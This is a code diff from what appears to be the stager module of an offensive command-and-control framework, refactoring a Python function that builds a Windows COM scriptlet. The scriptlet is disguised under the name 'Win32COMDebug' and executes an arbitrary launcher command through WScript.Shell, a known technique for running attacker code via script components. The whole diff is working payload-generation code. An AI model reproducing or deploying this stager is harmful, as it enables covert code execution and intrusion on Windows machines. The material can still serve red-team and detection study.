@@ -147,28 +147,28 @@ class Stager:
         if launcher == "":
             log.error("[!] Error in launcher command generation.")
             return ""
-        else:
-            code = '<?XML version="1.0"?>\n'
-            code += "<scriptlet>\n"
-            code += "<registration\n"
-            code += 'description="Win32COMDebug"\n'
-            code += 'progid="Win32COMDebug"\n'
-            code += 'version="1.00"\n'
-            code += 'classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"\n'
-            code += " >\n"
-            code += ' <script language="JScript">\n'
-            code += "      <![CDATA[\n"
-            code += (
-                '           var r = new ActiveXObject("WScript.Shell").Run(\''
-                + launcher.replace("'", "\\'")
-                + "');\n"
-            )
-            code += "      ]]>\n"
-            code += " </script>\n"
-            code += "</registration>\n"
-            code += "<public>\n"
-            code += '    <method name="Exec"></method>\n'
-            code += "</public>\n"
-            code += "</scriptlet>\n"
+
+        code = '<?XML version="1.0"?>\n'
+        code += "<scriptlet>\n"
+        code += "<registration\n"
+        code += 'description="Win32COMDebug"\n'
+        code += 'progid="Win32COMDebug"\n'
+        code += 'version="1.00"\n'
+        code += 'classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"\n'
+        code += " >\n"
+        code += ' <script language="JScript">\n'
+        code += "      <![CDATA[\n"
+        code += (
+            '           var r = new ActiveXObject("WScript.Shell").Run(\''
+            + launcher.replace("'", "\\'")
+            + "');\n"
+        )
+        code += "      ]]>\n"
+        code += " </script>\n"
+        code += "</registration>\n"
+        code += "<public>\n"
+        code += '    <method name="Exec"></method>\n'
+        code += "</public>\n"
+        code += "</scriptlet>\n"
 
         return code
